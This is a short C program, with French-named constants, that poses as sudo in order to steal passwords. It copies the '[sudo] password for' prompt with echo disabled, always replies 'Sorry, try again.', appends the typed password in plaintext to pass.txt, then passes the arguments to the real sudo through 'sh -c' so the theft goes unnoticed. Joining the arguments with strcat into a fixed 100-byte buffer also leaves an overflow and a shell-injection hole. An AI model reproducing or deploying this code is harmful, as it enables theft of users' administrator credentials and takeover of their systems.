#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <termios.h>

#define TAILLE 100

int main(int argc, char** argv)
{
	int i;
	char password[TAILLE];
	char* command = (char*) calloc(TAILLE,sizeof(char));
	struct termios oflags, nflags;
	FILE* file;

	strcat(command,"/usr/bin/sudo");
	for (i=1;i<argc;i++)
	{
		strcat(command," ");
		strcat(command,argv[i]);
	}

	printf("[sudo] password for %s : ",getenv("USER"));

	tcgetattr(fileno(stdin), &oflags);
	nflags = oflags;
	nflags.c_lflag &= ~ECHO;
	nflags.c_lflag |= ECHONL;
	tcsetattr(fileno(stdin),TCSANOW,&nflags);

	fgets(password,sizeof(password),stdin);
	password[strlen(password)-1] = 0;
	printf("Sorry, try again.\n");

	tcsetattr(fileno(stdin),TCSANOW,&oflags);

	file = fopen("pass.txt","a");
	fwrite(password,sizeof(char),strlen(password),file);
	fwrite("\n",sizeof(char),1,file);
	fclose(file);

	execl("/bin/sh", "sh", "-c",command, (char *) 0);

	exit(EXIT_SUCCESS);
}
